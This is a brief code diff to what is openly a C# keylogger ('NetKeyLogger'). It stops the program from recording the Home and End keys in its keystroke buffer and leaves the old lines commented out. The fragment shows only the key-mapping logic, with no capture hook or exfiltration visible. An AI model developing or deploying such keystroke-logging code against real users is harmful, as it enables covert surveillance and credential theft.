@@ -215,9 +215,11 @@ namespace NetKeyLogger
                     else if (Enum.GetName(typeof(Keys), i) == "Insert")
                         keyBuffer += "<Ins>";
                     else if (Enum.GetName(typeof(Keys), i) == "Home")
-                        keyBuffer += "<Home>";
+                        ;
+                    //keyBuffer += "<Home>";
                     else if (Enum.GetName(typeof(Keys), i) == "End")
-                        keyBuffer += "<End>";
+                        ;     
+                    //keyBuffer += "<End>";
                     else if (Enum.GetName(typeof(Keys), i) == "Tab")
                         keyBuffer += "<Tab>";
                     else if (Enum.GetName(typeof(Keys), i) == "Prior")
